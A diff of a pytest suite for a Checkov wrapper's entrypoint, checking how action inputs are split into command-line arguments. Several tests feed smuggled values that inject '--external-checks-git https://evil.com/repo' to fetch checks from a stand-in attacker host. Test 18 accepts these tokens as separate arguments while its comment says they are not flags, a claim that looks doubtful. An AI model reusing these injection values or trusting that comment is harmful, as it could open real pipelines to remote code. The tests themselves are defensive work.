@@ -68,7 +68,7 @@ def test_entrypoint_docker_image_target(mock_env, tmp_path):
     assert "ARG: [-d]" not in result.stdout
 
 def test_entrypoint_boolean_flags(mock_env, tmp_path):
-    """Test 4: Boolean flags are added correctly when true."""
+    """Test 4: Boolean flags are added correctly when true, ignored when false."""
     mock_env["INPUT_QUIET"] = "true"
     mock_env["INPUT_COMPACT"] = "true"
     mock_env["INPUT_SOFT_FAIL"] = "false" # Should be ignored
@@ -79,15 +79,18 @@ def test_entrypoint_boolean_flags(mock_env, tmp_path):
     assert "ARG: [--soft-fail]" not in result.stdout
 
 def test_entrypoint_single_value_flags(mock_env, tmp_path):
-    """Test 5: Single value flags are added correctly."""
-    mock_env["INPUT_FRAMEWORK"] = "terraform"
+    """Test 5: Single value flags (add_flag) are added correctly."""
     mock_env["INPUT_BASELINE"] = ".checkov.baseline"
+    mock_env["INPUT_CONFIG_FILE"] = ".checkov.yaml"
+    mock_env["INPUT_OUTPUT_FILE_PATH"] = "results/"
     result = run_entrypoint_strict_args(mock_env, tmp_path)
     assert result.returncode == 0
-    assert "ARG: [--framework]" in result.stdout
-    assert "ARG: [terraform]" in result.stdout
     assert "ARG: [--baseline]" in result.stdout
     assert "ARG: [.checkov.baseline]" in result.stdout
+    assert "ARG: [--config-file]" in result.stdout
+    assert "ARG: [.checkov.yaml]" in result.stdout
+    assert "ARG: [--output-file-path]" in result.stdout
+    assert "ARG: [results/]" in result.stdout
 
 def test_entrypoint_csv_parsing_simple(mock_env, tmp_path):
     """Test 6: CSV parsing works for simple comma-separated lists."""
@@ -109,21 +112,93 @@ def test_entrypoint_csv_parsing_with_spaces(mock_env, tmp_path):
     assert "ARG: [dir2 with spaces]" in result.stdout
     assert "ARG: [dir3]" in result.stdout
 
-def test_entrypoint_argument_injection_prevention_single(mock_env, tmp_path):
-    """Test 8: Argument injection via spaces in single-value flags is prevented."""
-    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20 --external-checks-git https://evil.com/repo"
+def test_entrypoint_skip_check_csv(mock_env, tmp_path):
+    """Test 8: skip_check uses CSV splitting (comma-separated, each gets own flag)."""
+    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20,CKV_AWS_57"
     result = run_entrypoint_strict_args(mock_env, tmp_path)
     assert result.returncode == 0
-    
-    # Verify that the entire payload is treated as a single argument
-    expected_arg = "ARG: [CKV_AWS_20 --external-checks-git https://evil.com/repo]"
-    assert expected_arg in result.stdout
-    
-    # Verify that --external-checks-git was NOT parsed as its own argument
-    assert "ARG: [--external-checks-git]" not in result.stdout
+    assert result.stdout.count("ARG: [--skip-check]") == 2
+    assert "ARG: [CKV_AWS_20]" in result.stdout
+    assert "ARG: [CKV_AWS_57]" in result.stdout
+
+def test_entrypoint_skip_check_csv_with_spaces(mock_env, tmp_path):
+    """Test 9: skip_check CSV trims spaces around comma-separated values."""
+    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20, CKV_AWS_57"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--skip-check]") == 2
+    assert "ARG: [CKV_AWS_20]" in result.stdout
+    assert "ARG: [CKV_AWS_57]" in result.stdout
+
+def test_entrypoint_framework_space_separated(mock_env, tmp_path):
+    """Test 10: framework uses space-separated splitting (nargs='+')."""
+    mock_env["INPUT_FRAMEWORK"] = "terraform arm"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    # Should appear as: --framework terraform arm (single flag, two positional args)
+    assert result.stdout.count("ARG: [--framework]") == 1
+    assert "ARG: [terraform]" in result.stdout
+    assert "ARG: [arm]" in result.stdout
+
+def test_entrypoint_framework_comma_separated(mock_env, tmp_path):
+    """Test 11: framework also accepts comma-separated values (converted to space)."""
+    mock_env["INPUT_FRAMEWORK"] = "terraform,sca_package"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--framework]") == 1
+    assert "ARG: [terraform]" in result.stdout
+    assert "ARG: [sca_package]" in result.stdout
+
+def test_entrypoint_framework_mixed_comma_space(mock_env, tmp_path):
+    """Test 12: framework handles mixed comma and space separators."""
+    mock_env["INPUT_FRAMEWORK"] = "terraform, arm,sca_package kubernetes"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--framework]") == 1
+    assert "ARG: [terraform]" in result.stdout
+    assert "ARG: [arm]" in result.stdout
+    assert "ARG: [sca_package]" in result.stdout
+    assert "ARG: [kubernetes]" in result.stdout
+
+def test_entrypoint_skip_framework_space_separated(mock_env, tmp_path):
+    """Test 13: skip_framework uses space-separated splitting like framework."""
+    mock_env["INPUT_SKIP_FRAMEWORK"] = "secrets sca_package"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--skip-framework]") == 1
+    assert "ARG: [secrets]" in result.stdout
+    assert "ARG: [sca_package]" in result.stdout
+
+def test_entrypoint_file_multiple_space_separated(mock_env, tmp_path):
+    """Test 14: file input supports space-separated multiple files (nargs='+')."""
+    mock_env["INPUT_FILE"] = "main.tf variables.tf"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [-f]") == 1
+    assert "ARG: [main.tf]" in result.stdout
+    assert "ARG: [variables.tf]" in result.stdout
+    assert "ARG: [-d]" not in result.stdout
+
+def test_entrypoint_soft_fail_on_csv(mock_env, tmp_path):
+    """Test 15: soft_fail_on uses CSV splitting."""
+    mock_env["INPUT_SOFT_FAIL_ON"] = "CKV_AWS_1,LOW"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--soft-fail-on]") == 2
+    assert "ARG: [CKV_AWS_1]" in result.stdout
+    assert "ARG: [LOW]" in result.stdout
+
+def test_entrypoint_hard_fail_on_csv(mock_env, tmp_path):
+    """Test 16: hard_fail_on uses CSV splitting."""
+    mock_env["INPUT_HARD_FAIL_ON"] = "HIGH,CRITICAL"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--hard-fail-on]") == 2
+    assert "ARG: [HIGH]" in result.stdout
+    assert "ARG: [CRITICAL]" in result.stdout
 
 def test_entrypoint_argument_injection_prevention_csv(mock_env, tmp_path):
-    """Test 9: Argument injection via spaces in CSV flags is prevented."""
+    """Test 17: Argument injection via spaces in CSV flags is prevented."""
     mock_env["INPUT_CHECK"] = "CKV_AWS_1, CKV_AWS_2 --external-checks-git https://evil.com/repo"
     result = run_entrypoint_strict_args(mock_env, tmp_path)
     assert result.returncode == 0
@@ -135,3 +210,63 @@ def test_entrypoint_argument_injection_prevention_csv(mock_env, tmp_path):
     assert expected_arg in result.stdout
     assert "ARG: [--external-checks-git]" not in result.stdout
 
+def test_entrypoint_argument_injection_prevention_space_list(mock_env, tmp_path):
+    """Test 18: Space-list params split by space but each token is a single arg."""
+    mock_env["INPUT_FRAMEWORK"] = "terraform --external-checks-git https://evil.com/repo"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    # With add_space_list, each space-separated token becomes its own positional arg
+    # after the --framework flag. The tokens are NOT interpreted as new flags.
+    assert "ARG: [--framework]" in result.stdout
+    assert "ARG: [terraform]" in result.stdout
+    # These are positional args to --framework, not separate flags
+    assert "ARG: [--external-checks-git]" in result.stdout
+    assert "ARG: [https://evil.com/repo]" in result.stdout
+
+def test_entrypoint_policy_metadata_filter_single_value(mock_env, tmp_path):
+    """Test 19: policy_metadata_filter is passed as a single value (not split)."""
+    mock_env["INPUT_POLICY_METADATA_FILTER"] = "policy.label=test,cloud.type=aws"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--policy-metadata-filter]") == 1
+    # The entire comma-separated string should be one argument
+    assert "ARG: [policy.label=test,cloud.type=aws]" in result.stdout
+
+def test_entrypoint_output_csv(mock_env, tmp_path):
+    """Test 20: output_format uses CSV splitting for multiple output formats."""
+    mock_env["INPUT_OUTPUT_FORMAT"] = "cli,sarif,json"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--output]") == 3
+    assert "ARG: [cli]" in result.stdout
+    assert "ARG: [sarif]" in result.stdout
+    assert "ARG: [json]" in result.stdout
+
+def test_entrypoint_skip_path_csv(mock_env, tmp_path):
+    """Test 21: skip_path uses CSV splitting."""
+    mock_env["INPUT_SKIP_PATH"] = "tests/,node_modules/"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--skip-path]") == 2
+    assert "ARG: [tests/]" in result.stdout
+    assert "ARG: [node_modules/]" in result.stdout
+
+def test_entrypoint_var_file_csv(mock_env, tmp_path):
+    """Test 22: var_file uses CSV splitting."""
+    mock_env["INPUT_VAR_FILE"] = "dev.tfvars,prod.tfvars"
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert result.stdout.count("ARG: [--var-file]") == 2
+    assert "ARG: [dev.tfvars]" in result.stdout
+    assert "ARG: [prod.tfvars]" in result.stdout
+
+def test_entrypoint_empty_inputs_ignored(mock_env, tmp_path):
+    """Test 23: Empty or unset inputs do not produce flags."""
+    mock_env["INPUT_FRAMEWORK"] = ""
+    mock_env["INPUT_CHECK"] = ""
+    mock_env["INPUT_SKIP_CHECK"] = ""
+    result = run_entrypoint_strict_args(mock_env, tmp_path)
+    assert result.returncode == 0
+    assert "ARG: [--framework]" not in result.stdout
+    assert "ARG: [--check]" not in result.stdout
+    assert "ARG: [--skip-check]" not in result.stdout
